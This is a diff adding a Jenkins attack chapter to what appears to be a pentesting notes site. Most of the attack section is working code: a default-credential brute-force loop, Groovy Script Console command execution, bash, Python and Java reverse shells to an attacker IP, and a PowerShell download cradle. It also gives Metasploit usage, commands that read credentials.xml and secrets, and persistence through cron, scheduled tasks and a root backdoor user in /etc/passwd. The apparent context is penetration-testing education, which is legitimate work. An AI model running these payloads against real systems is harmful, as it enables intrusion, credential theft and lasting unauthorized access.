@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-342697bd.js";
+            window.path_to_searchindex_js = "searchindex-b5ad1aa7.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-2e1293d2.js"></script>
+        <script src="toc-cbbb72f8.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -25933,6 +25933,15 @@ SQL&gt; xp_cmdshell whoami /priv
 </ul>
 </li>
 </ul>
+<h3 id="jenkins"><a class="header" href="#jenkins">Jenkins</a></h3>
+<ul>
+<li><a href="infosec/attacking-common-applications/jenkins">Jenkins — discovery &amp; enumeration, Script Console RCE, default credentials, plugin enumeration</a>
+<ul>
+<li><a href="#jenkins--discovery--enumeration">Discovery &amp; Enumeration — fingerprinting, version detection, anonymous access, API enumeration, plugin discovery, credential testing</a></li>
+<li><a href="#attacking-jenkins">Attacking Jenkins — Script Console RCE, Groovy command execution, reverse shells (Linux/Windows), vulnerabilities, data exfiltration, persistence</a></li>
+</ul>
+</li>
+</ul>
 <h2 id="summary-5"><a class="header" href="#summary-5">Summary</a></h2>
 <p>Attacking common applications begins with a structured discovery phase before any exploitation is attempted. <strong>Nmap</strong> sweeps the scope list for common web ports (80, 443, 8000, 8080, 8180, 8888, 10000) using <code>--open -oA</code> to produce XML output that downstream tools can consume directly. A follow-up service version scan (<code>-sV</code>) fingerprints what is actually running — frequently revealing Splunk, PRTG, Tomcat, or other management interfaces on non-standard ports that are easily missed.</p>
 <p><strong>EyeWitness</strong> (<code>eyewitness --web -x web_discovery.xml</code>) and <strong>Aquatone</strong> (<code>cat web_discovery.xml | ./aquatone -nmap</code>) both accept Nmap XML and produce HTML screenshot reports, grouping targets into categories such as “High Value Targets.” These reports rapidly surface default-credential login pages (Tomcat Manager, Splunk, PRTG) and default install pages that confirm software versions without manual browsing across dozens of hosts.</p>
@@ -27460,8 +27469,592 @@ spring.datasource.password=SecureP@ssw0rd!
 </ol>
 <p>Tomcat is frequently a high-value foothold, especially in internal environments where it’s often forgotten and misconfigured.</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="command-injection-1"><a class="header" href="#command-injection-1">Command Injection</a></h1>
+<h1 id="jenkins-1"><a class="header" href="#jenkins-1">Jenkins</a></h1>
 <h2 id="directory-map-20"><a class="header" href="#directory-map-20">Directory map</a></h2>
+<ul>
+<li><a href="#jenkins--discovery--enumeration">Jenkins — Discovery &amp; Enumeration — fingerprinting, version detection, anonymous access, API enumeration, plugin discovery, default credentials</a></li>
+<li><a href="#attacking-jenkins">Attacking Jenkins — Script Console RCE, Groovy command execution, reverse shells (Linux/Windows), vulnerabilities, data exfiltration, persistence</a></li>
+</ul>
+<h2 id="summary-10"><a class="header" href="#summary-10">Summary</a></h2>
+<p>Jenkins is an open-source automation server for continuous integration and continuous deployment (CI/CD). It’s widely used in development environments and increasingly common on internal networks where it integrates with production systems.</p>
+<p><strong>Key characteristics:</strong></p>
+<ul>
+<li><strong>Port:</strong> Default 8080 (also 8000, 8888, 9000 in non-standard configs)</li>
+<li><strong>Fingerprinting:</strong> Version exposed in HTTP headers and page source</li>
+<li><strong>Authentication:</strong> Often uses weak/default credentials or no authentication</li>
+<li><strong>Script Console:</strong> Groovy scripting interface for RCE (admin only)</li>
+<li><strong>High privileges:</strong> Jenkins often runs as root or SYSTEM</li>
+<li><strong>Secrets storage:</strong> Contains credentials for CI/CD pipelines and integrations</li>
+<li><strong>Plugins:</strong> Extensible architecture; outdated plugins may have CVEs</li>
+</ul>
+<p><strong>Attack surface:</strong></p>
+<ul>
+<li>Default credentials (admin:admin, jenkins:jenkins)</li>
+<li>Weak password brute-forcing</li>
+<li>Pre-authentication RCE via CVE-2018-1999002/CVE-2019-1003000 (Jenkins &lt; 2.137)</li>
+<li>Script Console access = arbitrary code execution</li>
+<li>Anonymous access allows information gathering</li>
+<li>Plugin vulnerabilities (version-specific)</li>
+<li>Build artifact/log access may expose secrets</li>
+</ul>
+<p><strong>Common vulnerabilities:</strong></p>
+<ul>
+<li>CVE-2018-1999002 &amp; CVE-2019-1003000 — Pre-auth RCE (&lt; 2.137)</li>
+<li>CVE-2019-1003000 — Script sandbox bypass</li>
+<li>Jenkins 2.150.2 — Node.js RCE</li>
+<li>Credentials exposed in build logs</li>
+<li>Hardcoded secrets in pipeline scripts</li>
+</ul>
+<p><strong>Post-exploitation value:</strong></p>
+<ul>
+<li>Access to CI/CD infrastructure</li>
+<li>Extraction of credentials for multiple systems</li>
+<li>Code repository access</li>
+<li>Deployment environment access</li>
+<li>Lateral movement into production systems</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="jenkins--discovery--enumeration"><a class="header" href="#jenkins--discovery--enumeration">Jenkins — Discovery &amp; Enumeration</a></h1>
+<p>Jenkins is an open-source automation server commonly used for continuous integration and continuous deployment (CI/CD). It’s frequently found in development environments and increasingly in internal networks. Jenkins deployments often run with high privileges and contain access to sensitive systems.</p>
+<h2 id="fingerprinting--discovery-1"><a class="header" href="#fingerprinting--discovery-1">Fingerprinting &amp; Discovery</a></h2>
+<h3 id="port--service-detection"><a class="header" href="#port--service-detection">Port &amp; Service Detection</a></h3>
+<p>Jenkins typically runs on port 8080 (or 8000, 8888, 9000 in non-standard configurations).</p>
+<p><strong>Nmap service detection:</strong></p>
+<pre><code class="language-bash">nmap -sV -p 8000-9000 target.com
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Jenkins 2.303.1
+</code></pre>
+<h3 id="http-headers"><a class="header" href="#http-headers">HTTP Headers</a></h3>
+<p>Jenkins exposes version information in HTTP headers and page source:</p>
+<pre><code class="language-bash">curl -i http://target.com:8080/ | grep -i "jenkins\|x-jenkins"
+
+Server: Jenkins/2.303.1
+X-Jenkins: 2.303.1
+X-Jenkins-Session: 1234abcd5678efgh
+</code></pre>
+<h3 id="jenkins-landing-page"><a class="header" href="#jenkins-landing-page">Jenkins Landing Page</a></h3>
+<p>The default Jenkins page at <code>http://target.com:8080/</code> displays:</p>
+<ul>
+<li>Jenkins version prominently</li>
+<li>“Jenkins” branding throughout</li>
+<li>Login page with generic message</li>
+<li>Links to <code>/manage</code> (if anonymous access enabled)</li>
+</ul>
+<h3 id="version-detection"><a class="header" href="#version-detection">Version Detection</a></h3>
+<p><strong>Via HTTP headers:</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/ | grep -oP 'Jenkins.*?(\d+\.\d+\.\d+)' | head -1
+# Output: Jenkins 2.303.1
+</code></pre>
+<p><strong>Via page source:</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/ | grep -i "jenkins" | head -5
+</code></pre>
+<p><strong>Via CLI:</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/cli/ | grep version
+</code></pre>
+<hr>
+<h2 id="enumeration-techniques"><a class="header" href="#enumeration-techniques">Enumeration Techniques</a></h2>
+<h3 id="anonymous-access"><a class="header" href="#anonymous-access">Anonymous Access</a></h3>
+<p>Test if anonymous access is permitted:</p>
+<pre><code class="language-bash">curl -s http://target.com:8080/manage
+# 200 = Access allowed (anonymous access enabled)
+# 403 = Access denied
+# 302 = Redirect to login
+</code></pre>
+<p>If anonymous access is enabled, users can:</p>
+<ul>
+<li>Browse jobs and builds</li>
+<li>View console outputs</li>
+<li>Create jobs (in some configurations)</li>
+<li>Access build artifacts</li>
+</ul>
+<h3 id="directory-enumeration"><a class="header" href="#directory-enumeration">Directory Enumeration</a></h3>
+<p>Common Jenkins endpoints:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Path</th><th>Purpose</th><th>Access</th></tr>
+</thead>
+<tbody>
+<tr><td><code>/</code></td><td>Dashboard</td><td>Public/Authenticated</td></tr>
+<tr><td><code>/login</code></td><td>Login page</td><td>Public</td></tr>
+<tr><td><code>/admin</code></td><td>Admin panel</td><td>Admin only</td></tr>
+<tr><td><code>/manage</code></td><td>System management</td><td>Admin/System read</td></tr>
+<tr><td><code>/script</code></td><td>Script Console</td><td>Admin only</td></tr>
+<tr><td><code>/queue</code></td><td>Build queue</td><td>Public</td></tr>
+<tr><td><code>/nodes</code></td><td>Agent nodes</td><td>Admin only</td></tr>
+<tr><td><code>/job/*</code></td><td>Job details</td><td>Depends on job</td></tr>
+<tr><td><code>/api/json</code></td><td>API endpoint</td><td>Public/Authenticated</td></tr>
+<tr><td><code>/cli</code></td><td>Command-line interface</td><td>Varies</td></tr>
+</tbody>
+</table>
+</div>
+<p><strong>Gobuster scan:</strong></p>
+<pre><code class="language-bash">gobuster dir -u http://target.com:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+
+/admin (Status: 403)
+/manage (Status: 403)
+/job (Status: 302)
+/api (Status: 200)
+/script (Status: 403)
+/queue (Status: 403)
+/login (Status: 200)
+</code></pre>
+<h3 id="api-enumeration"><a class="header" href="#api-enumeration">API Enumeration</a></h3>
+<p>Jenkins provides a JSON API for querying information:</p>
+<p><strong>Check accessible API:</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/api/json | jq .
+
+{
+  "version": "2.303.1",
+  "_class": "hudson.model.Hudson",
+  "jobs": [
+    {
+      "name": "project-a",
+      "url": "http://target.com:8080/job/project-a/"
+    }
+  ]
+}
+</code></pre>
+<p><strong>List all jobs:</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/api/json?pretty=true | grep -A2 '"name"'
+</code></pre>
+<p><strong>Job details:</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/job/project-a/api/json | jq .
+</code></pre>
+<p><strong>Build information:</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/job/project-a/1/api/json | jq .
+</code></pre>
+<h3 id="plugin-enumeration"><a class="header" href="#plugin-enumeration">Plugin Enumeration</a></h3>
+<p>Jenkins plugins can be discovered through:</p>
+<p><strong>Via page source:</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/ | grep -o 'pluginManager[^"]*' | sort -u
+</code></pre>
+<p><strong>Via plugins API:</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/pluginManager/api/json | jq '.plugins[] | .shortName, .version' 
+</code></pre>
+<p><strong>Via plugin directory (if accessible):</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/plugins/ 
+# May reveal installed plugins in 404 error messages
+</code></pre>
+<hr>
+<h2 id="credential-testing"><a class="header" href="#credential-testing">Credential Testing</a></h2>
+<h3 id="default-credentials"><a class="header" href="#default-credentials">Default Credentials</a></h3>
+<p>Common Jenkins default credentials:</p>
+<pre><code>admin:admin
+admin:password
+jenkins:jenkins
+admin:jenkins
+admin:changeme
+root:root
+</code></pre>
+<h3 id="credential-testing-methods"><a class="header" href="#credential-testing-methods">Credential Testing Methods</a></h3>
+<p><strong>Via web interface:</strong></p>
+<ol>
+<li>Navigate to <code>http://target.com:8080/login</code></li>
+<li>Enter credentials</li>
+<li>Check if login succeeds</li>
+</ol>
+<p><strong>Via cURL:</strong></p>
+<pre><code class="language-bash">curl -u admin:admin http://target.com:8080/manage
+# 200 = Valid credentials
+# 401 = Invalid credentials
+# 403 = Valid credentials, insufficient privileges
+</code></pre>
+<p><strong>Automated testing:</strong></p>
+<pre><code class="language-bash">#!/bin/bash
+users=("admin" "jenkins" "root")
+passwords=("admin" "password" "jenkins" "changeme" "root")
+
+for user in "${users[@]}"; do
+  for pass in "${passwords[@]}"; do
+    response=$(curl -s -u "$user:$pass" -w "%{http_code}" http://target.com:8080/manage -o /dev/null)
+    if [ "$response" -eq 200 ] || [ "$response" -eq 403 ]; then
+      echo "[+] Valid: $user:$pass (HTTP $response)"
+    fi
+  done
+done
+</code></pre>
+<hr>
+<h2 id="security-assessment"><a class="header" href="#security-assessment">Security Assessment</a></h2>
+<h3 id="key-findings"><a class="header" href="#key-findings">Key Findings</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Finding</th><th>Severity</th><th>Impact</th></tr>
+</thead>
+<tbody>
+<tr><td>Anonymous access enabled</td><td><strong>High</strong></td><td>Information disclosure, potential RCE if builds are accessible</td></tr>
+<tr><td>Default credentials</td><td><strong>Critical</strong></td><td>Full Jenkins compromise, RCE</td></tr>
+<tr><td>Weak/guessable credentials</td><td><strong>Critical</strong></td><td>Authentication bypass, RCE</td></tr>
+<tr><td>Script Console accessible</td><td><strong>Critical</strong></td><td>RCE with Jenkins privileges</td></tr>
+<tr><td>Plugin vulnerabilities</td><td>Varies</td><td>Depends on plugin CVE</td></tr>
+<tr><td>Outdated Jenkins version</td><td><strong>High</strong></td><td>Known CVE exploitation</td></tr>
+<tr><td>Exposed build artifacts</td><td><strong>Medium</strong></td><td>Information disclosure</td></tr>
+<tr><td>Pipeline scripts with secrets</td><td><strong>High</strong></td><td>Credential exposure</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="configuration-review"><a class="header" href="#configuration-review">Configuration Review</a></h3>
+<p><strong>Check authentication:</strong></p>
+<pre><code class="language-bash">curl -s http://target.com:8080/manage 2&gt;/dev/null | grep -i "security\|auth"
+</code></pre>
+<p><strong>Check security realm:</strong></p>
+<pre><code class="language-bash">curl -u admin:admin http://target.com:8080/manage 2&gt;/dev/null | grep -i "security realm"
+</code></pre>
+<hr>
+<h2 id="common-misconfigurations"><a class="header" href="#common-misconfigurations">Common Misconfigurations</a></h2>
+<ol>
+<li>
+<p><strong>Anonymous access enabled</strong> — Allows unauthenticated users to:</p>
+<ul>
+<li>View all jobs and builds</li>
+<li>Access build console output</li>
+<li>Read build artifacts (may contain secrets)</li>
+<li>Create jobs (sometimes)</li>
+</ul>
+</li>
+<li>
+<p><strong>Weak authentication</strong> — Default or simple passwords easily brute-forced</p>
+</li>
+<li>
+<p><strong>No role-based access control</strong> — All authenticated users have admin access</p>
+</li>
+<li>
+<p><strong>Jenkins running as root</strong> — RCE results in root shell</p>
+</li>
+<li>
+<p><strong>Outdated plugins</strong> — Unpatched known vulnerabilities</p>
+</li>
+<li>
+<p><strong>Build scripts with secrets</strong> — Credentials visible in console output or logs</p>
+</li>
+</ol>
+<hr>
+<h2 id="pre-exploitation-checklist"><a class="header" href="#pre-exploitation-checklist">Pre-Exploitation Checklist</a></h2>
+<ul>
+<li><input disabled="" type="checkbox"> Identify Jenkins version and note any known CVEs</li>
+<li><input disabled="" type="checkbox"> Test for anonymous/unauthenticated access</li>
+<li><input disabled="" type="checkbox"> Enumerate accessible jobs and build history</li>
+<li><input disabled="" type="checkbox"> Attempt common default credentials</li>
+<li><input disabled="" type="checkbox"> Check for exposed build artifacts or logs</li>
+<li><input disabled="" type="checkbox"> Identify Jenkins installation directory and running user</li>
+<li><input disabled="" type="checkbox"> Look for hardcoded credentials in build scripts</li>
+<li><input disabled="" type="checkbox"> Note any plugins and check for known vulnerabilities</li>
+<li><input disabled="" type="checkbox"> Determine if Script Console is accessible</li>
+<li><input disabled="" type="checkbox"> Document all findings for exploitation phase</li>
+</ul>
+<hr>
+<h2 id="next-steps-1"><a class="header" href="#next-steps-1">Next Steps</a></h2>
+<p>Once enumeration is complete:</p>
+<ul>
+<li>If valid credentials found → attempt Script Console RCE</li>
+<li>If anonymous access → attempt job manipulation or artifact access</li>
+<li>If known CVE applies → attempt automated exploitation</li>
+<li>If outdated plugins → look for plugin-specific exploits</li>
+<li>If no direct RCE → extract information for lateral movement</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="attacking-jenkins"><a class="header" href="#attacking-jenkins">Attacking Jenkins</a></h1>
+<p>Once access to Jenkins is obtained (via default credentials, weak passwords, or unauthenticated access), the Script Console provides a direct path to remote code execution with Jenkins’ privileges, often root or SYSTEM.</p>
+<hr>
+<h2 id="script-console-overview"><a class="header" href="#script-console-overview">Script Console Overview</a></h2>
+<p>The Script Console is accessible at:</p>
+<pre><code>http://target.com:8080/script
+</code></pre>
+<p><strong>Permissions:</strong> Requires “Overall/AdministrConfig” or “Overall/Run Scripts” permission.</p>
+<p>The console allows execution of arbitrary Apache Groovy scripts within the Jenkins controller runtime. Groovy is a Java-compatible language that compiles to Java bytecode and can execute operating system commands.</p>
+<hr>
+<h2 id="command-execution-via-groovy"><a class="header" href="#command-execution-via-groovy">Command Execution via Groovy</a></h2>
+<h3 id="basic-command-execution"><a class="header" href="#basic-command-execution">Basic Command Execution</a></h3>
+<p>Execute a simple command and capture output:</p>
+<pre><code class="language-groovy">def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<h3 id="multi-line-command-execution"><a class="header" href="#multi-line-command-execution">Multi-line Command Execution</a></h3>
+<p>Execute complex commands with pipes and redirects:</p>
+<pre><code class="language-groovy">def cmd = 'bash -c "whoami; id; pwd"'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+</code></pre>
+<h3 id="directory-listing"><a class="header" href="#directory-listing">Directory Listing</a></h3>
+<pre><code class="language-groovy">def cmd = 'ls -la /opt/jenkins'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+</code></pre>
+<h3 id="read-files"><a class="header" href="#read-files">Read Files</a></h3>
+<pre><code class="language-groovy">def cmd = 'cat /etc/passwd'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+</code></pre>
+<hr>
+<h2 id="reverse-shell---linux"><a class="header" href="#reverse-shell---linux">Reverse Shell - Linux</a></h2>
+<h3 id="bash-reverse-shell-tcp"><a class="header" href="#bash-reverse-shell-tcp">Bash Reverse Shell (TCP)</a></h3>
+<pre><code class="language-groovy">r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
+p.waitFor()
+</code></pre>
+<p><strong>Listener:</strong></p>
+<pre><code class="language-bash">nc -lvnp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+bash -i
+root@app02:/var/lib/jenkins#
+</code></pre>
+<h3 id="bash-reverse-shell-alternative"><a class="header" href="#bash-reverse-shell-alternative">Bash Reverse Shell (Alternative)</a></h3>
+<pre><code class="language-groovy">def cmd = 'bash -i &gt;&amp; /dev/tcp/10.10.14.15/8443 0&gt;&amp;1'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+</code></pre>
+<h3 id="python-reverse-shell"><a class="header" href="#python-reverse-shell">Python Reverse Shell</a></h3>
+<pre><code class="language-groovy">def cmd = 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.10.14.15\',8443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/bash\',\'-i\']);\"'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+</code></pre>
+<hr>
+<h2 id="reverse-shell---windows"><a class="header" href="#reverse-shell---windows">Reverse Shell - Windows</a></h2>
+<h3 id="cmd-execution"><a class="header" href="#cmd-execution">CMD Execution</a></h3>
+<pre><code class="language-groovy">def cmd = "cmd.exe /c dir"
+println("${cmd.execute().text}")
+</code></pre>
+<h3 id="powershell-download-cradle"><a class="header" href="#powershell-download-cradle">PowerShell Download Cradle</a></h3>
+<p>Use Invoke-PowerShellTcp.ps1 from Nishang:</p>
+<pre><code class="language-groovy">def cmd = 'powershell -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.15/Invoke-PowerShellTcp.ps1\')"'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(5000)
+</code></pre>
+<h3 id="java-reverse-shell-windows"><a class="header" href="#java-reverse-shell-windows">Java Reverse Shell (Windows)</a></h3>
+<pre><code class="language-groovy">String host="10.10.14.15";
+int port=8444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+  while(pi.available()&gt;0)so.write(pi.read());
+  while(pe.available()&gt;0)so.write(pe.read());
+  while(si.available()&gt;0)po.write(si.read());
+  so.flush();
+  po.flush();
+  Thread.sleep(50);
+  try {
+    p.exitValue();
+    break;
+  }catch (Exception e){}
+};
+p.destroy();
+s.close();
+</code></pre>
+<h3 id="add-user-alternative-to-reverse-shell"><a class="header" href="#add-user-alternative-to-reverse-shell">Add User (Alternative to Reverse Shell)</a></h3>
+<p>Avoid persistence detection by adding a user for RDP/WinRM access:</p>
+<pre><code class="language-groovy">def cmd = 'net user hacker P@ssw0rd123! /add'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+
+// Add to Administrators group
+cmd = 'net localgroup Administrators hacker /add'
+proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+</code></pre>
+<p>Then connect via RDP or WinRM with the new credentials.</p>
+<hr>
+<h2 id="reverse-shell-payloads-pre-built"><a class="header" href="#reverse-shell-payloads-pre-built">Reverse Shell Payloads (Pre-built)</a></h2>
+<h3 id="using-msfvenom"><a class="header" href="#using-msfvenom">Using msfvenom</a></h3>
+<pre><code class="language-bash"># Java reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=8443 -f jar &gt; shell.jar
+
+# Execute via Groovy
+def cmd = 'java -jar /tmp/shell.jar'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+</code></pre>
+<h3 id="using-metasploit-module"><a class="header" href="#using-metasploit-module">Using Metasploit Module</a></h3>
+<pre><code class="language-bash">msf6&gt; use exploit/multi/misc/jenkins_rce
+msf6 exploit(multi/misc/jenkins_rce) &gt; set RHOSTS 10.129.201.58
+msf6 exploit(multi/misc/jenkins_rce) &gt; set RPORT 8080
+msf6 exploit(multi/misc/jenkins_rce) &gt; set USERNAME admin
+msf6 exploit(multi/misc/jenkins_rce) &gt; set PASSWORD password123
+msf6 exploit(multi/misc/jenkins_rce) &gt; set LHOST 10.10.14.15
+msf6 exploit(multi/misc/jenkins_rce) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444
+[*] Interacting with Jenkins...
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -&gt; 10.129.201.58:45678)
+
+meterpreter&gt; shell
+Process 1234 created.
+Channel 1 created.
+
+bash-4.2$ id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<hr>
+<h2 id="jenkins-vulnerabilities"><a class="header" href="#jenkins-vulnerabilities">Jenkins Vulnerabilities</a></h2>
+<h3 id="cve-2018-1999002--cve-2019-1003000"><a class="header" href="#cve-2018-1999002--cve-2019-1003000">CVE-2018-1999002 &amp; CVE-2019-1003000</a></h3>
+<p><strong>Affected versions:</strong> Jenkins &lt; 2.137<br><strong>Type:</strong> Pre-authenticated RCE<br><strong>Requirements:</strong> None (unauthenticated)<br><strong>Bypass:</strong> Dynamic routing ACL bypass + script sandbox bypass</p>
+<p><strong>Impact:</strong> Attackers can execute arbitrary code on the Jenkins master server without authentication.</p>
+<p><strong>Exploitation:</strong></p>
+<ul>
+<li>Exploits flaw in Jenkins dynamic routing to bypass Overall/Read ACL check</li>
+<li>Uses Groovy script compilation bypass to execute code outside sandbox</li>
+<li>Downloads and executes malicious JAR files</li>
+</ul>
+<p><strong>PoC:</strong> Public exploits available on GitHub and exploit databases.</p>
+<h3 id="cve-2019-1003000-details"><a class="header" href="#cve-2019-1003000-details">CVE-2019-1003000 Details</a></h3>
+<ul>
+<li><strong>Affected:</strong> Jenkins 2.137 and earlier</li>
+<li><strong>Type:</strong> Script security sandbox bypass</li>
+<li><strong>Method:</strong> Exploits script serialization during compilation</li>
+<li><strong>Impact:</strong> Read ACL users can execute arbitrary code</li>
+</ul>
+<h3 id="jenkins-21502-nodejs-rce"><a class="header" href="#jenkins-21502-nodejs-rce">Jenkins 2.150.2 Node.js RCE</a></h3>
+<p><strong>Affected version:</strong> Jenkins 2.150.2<br><strong>Requirements:</strong> JOB creation and BUILD privileges<br><strong>Default behavior:</strong> Anonymous users have these privileges</p>
+<p><strong>Exploitation:</strong></p>
+<pre><code class="language-groovy">// Node.js can be abused if installed
+def cmd = 'node -e "require(\'child_process\').exec(\'id\', (error, stdout, stderr) =&gt; { console.log(stdout); });"'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+</code></pre>
+<hr>
+<h2 id="data-exfiltration"><a class="header" href="#data-exfiltration">Data Exfiltration</a></h2>
+<h3 id="extract-credentials"><a class="header" href="#extract-credentials">Extract Credentials</a></h3>
+<p>Jenkins stores credentials in encrypted XML files:</p>
+<pre><code class="language-groovy">def cmd = 'cat /var/lib/jenkins/credentials.xml'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+</code></pre>
+<h3 id="extract-job-configuration"><a class="header" href="#extract-job-configuration">Extract Job Configuration</a></h3>
+<pre><code class="language-groovy">def cmd = 'find /var/lib/jenkins/jobs -name "config.xml"'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+</code></pre>
+<h3 id="extract-secrets"><a class="header" href="#extract-secrets">Extract Secrets</a></h3>
+<pre><code class="language-groovy">def cmd = 'grep -r "password\|secret\|token" /var/lib/jenkins/secrets/'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+</code></pre>
+<hr>
+<h2 id="persistence"><a class="header" href="#persistence">Persistence</a></h2>
+<h3 id="cron-job-linux"><a class="header" href="#cron-job-linux">Cron Job (Linux)</a></h3>
+<pre><code class="language-groovy">def cmd = 'echo "* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.15/8443 0&gt;&amp;1" | crontab -'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+</code></pre>
+<h3 id="scheduled-task-windows"><a class="header" href="#scheduled-task-windows">Scheduled Task (Windows)</a></h3>
+<pre><code class="language-groovy">def cmd = 'schtasks /create /tn "UpdateTask" /tr "powershell -Command IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.15/ps.ps1\')" /sc minute /mo 5'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+</code></pre>
+<h3 id="backdoor-user-linux"><a class="header" href="#backdoor-user-linux">Backdoor User (Linux)</a></h3>
+<pre><code class="language-groovy">def cmd = 'echo "backdoor:x:0:0::/root:/bin/bash" &gt;&gt; /etc/passwd'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+</code></pre>
+<hr>
+<h2 id="assessment-checklist-2"><a class="header" href="#assessment-checklist-2">Assessment Checklist</a></h2>
+<ul>
+<li><input disabled="" type="checkbox"> Identify Jenkins version and check for known CVEs</li>
+<li><input disabled="" type="checkbox"> Attempt default credentials (admin:admin, jenkins:jenkins)</li>
+<li><input disabled="" type="checkbox"> Test for anonymous/unauthenticated access</li>
+<li><input disabled="" type="checkbox"> If Script Console accessible, execute test command (id)</li>
+<li><input disabled="" type="checkbox"> Establish reverse shell (bash/python/java depending on OS)</li>
+<li><input disabled="" type="checkbox"> Extract credentials from <code>credentials.xml</code></li>
+<li><input disabled="" type="checkbox"> Enumerate jobs and extract sensitive build configuration</li>
+<li><input disabled="" type="checkbox"> Check for pipeline scripts with hardcoded secrets</li>
+<li><input disabled="" type="checkbox"> Document Jenkins running user and privileges</li>
+<li><input disabled="" type="checkbox"> Clean up any created users, cron jobs, or files</li>
+</ul>
+<hr>
+<h2 id="post-exploitation-1"><a class="header" href="#post-exploitation-1">Post-Exploitation</a></h2>
+<p>Once RCE is achieved:</p>
+<ol>
+<li><strong>Check privileges:</strong> Jenkins often runs as root or SYSTEM</li>
+<li><strong>Enumerate services:</strong> Use Jenkins access to discover internal services</li>
+<li><strong>Extract credentials:</strong> From Jenkins credentials store and job configs</li>
+<li><strong>Lateral movement:</strong> Use extracted credentials for internal network access</li>
+<li><strong>Establish persistence:</strong> Via cron, scheduled tasks, or user creation</li>
+</ol>
